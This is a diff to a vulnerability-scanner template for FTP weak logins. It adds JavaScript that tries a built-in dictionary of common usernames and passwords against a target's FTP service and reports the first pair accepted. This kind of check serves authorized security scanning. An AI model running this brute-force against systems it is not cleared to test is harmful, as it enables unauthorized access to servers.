@@ -6,7 +6,7 @@ info:
   severity: high
   verified: true
   description: |-
-    FTP weak credentials were discovered (dictionary brute-force in go).
+    FTP weak credentials were discovered (dictionary brute-force in javascript).
   tags: network,ftp,default-login,weak-login
   requires: [ftp]
   created: 2026/01/16
@@ -14,8 +14,76 @@ info:
 rules:
   r0:
     request:
-      type: go
-      data: ftp-weak-login
+      type: javascript
+      code: |
+        var net = require("afrog/net");
+
+        var port = /^[0-9]+$/.test(String(Port)) ? Port : "21";
+        var timeout = 3;
+        // 字典遍历的时间预算：避免慢目标把整个脚本拖到 -js-script-timeout 上限
+        var budget = 60000;
+
+        var usernames = ["ftp", "anonymous", "root", "admin", "user", "administrator", "webadmin", "www", "test"];
+        var passwords = ["ftp", "anonymous", "root", "admin", "123456", "password", "12345678", "12345", "test", "webadmin"];
+
+        function replyCode(s) {
+          if (!s || s.length < 3) return "";
+          return s.substring(0, 3);
+        }
+
+        // 返回 1 成功、0 失败、-1 连接失败
+        function attempt(user, pass) {
+          var c = net.TCPClient();
+          c.SetTimeout(timeout);
+          if (!c.Connect(Host, port)) return -1;
+
+          var banner = c.RecvUntil("\r\n");
+          if (replyCode(banner) !== "220") {
+            c.Close();
+            return 0;
+          }
+
+          c.Send("USER " + user + "\r\n");
+          var line = c.RecvUntil("\r\n");
+          // 331 需要口令；部分服务端 USER 直接返回 230
+          if (replyCode(line) === "331") {
+            c.Send("PASS " + pass + "\r\n");
+            line = c.RecvUntil("\r\n");
+          }
+          c.Close();
+
+          return replyCode(line) === "230" ? 1 : 0;
+        }
+
+        var result = "";
+        var tried = 0;
+        var deadline = Date.now() + budget;
+
+        for (var i = 0; i < usernames.length && result === ""; i++) {
+          for (var j = 0; j < passwords.length && result === ""; j++) {
+            if (Date.now() > deadline) {
+              result = "fail;reason=timeout;tried=" + tried;
+              break;
+            }
+            tried++;
+            var r = attempt(usernames[i], passwords[j]);
+            if (r === -1) {
+              result = "fail;reason=connect_failed;tried=" + tried;
+              break;
+            }
+            if (r === 1) {
+              result = "success;user=" + usernames[i] + ";pass=" + passwords[j];
+            }
+          }
+        }
+
+        if (result === "") {
+          result = "fail;reason=not_found;tried=" + tried;
+        }
+        Export(result);
+      args:
+        Host: "{{Host}}"
+        Port: "{{Port}}"
     expression: response.raw.bcontains(b"success;")
     extractors:
       - type: regex
